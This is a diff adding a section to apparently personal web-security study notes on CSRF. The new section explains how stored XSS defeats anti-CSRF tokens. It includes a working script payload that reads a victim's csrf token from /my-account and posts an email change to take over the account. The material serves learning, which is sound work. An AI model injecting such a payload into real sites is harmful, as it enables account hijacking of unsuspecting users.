@@ -199,3 +199,21 @@ admin:password
    *When CSRF occurs as a standalone vulnerability,*  
       it can be patched using strategies like **anti-CSRF tokens**.  
       However, these strategies **do not provide any protection if an XSS vulnerability is also present.**
+
+## Example: stored XSS to CSRF
+## Note: AJAX is used to send a request to the `my-account` page because it's where the `csrf` hidden input is present
+## After that, the `csrf` token is sent in the POST request to the `/my-account/change-email` page where it changes the email the value we mentioned `test@test.com`
+```html
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+```
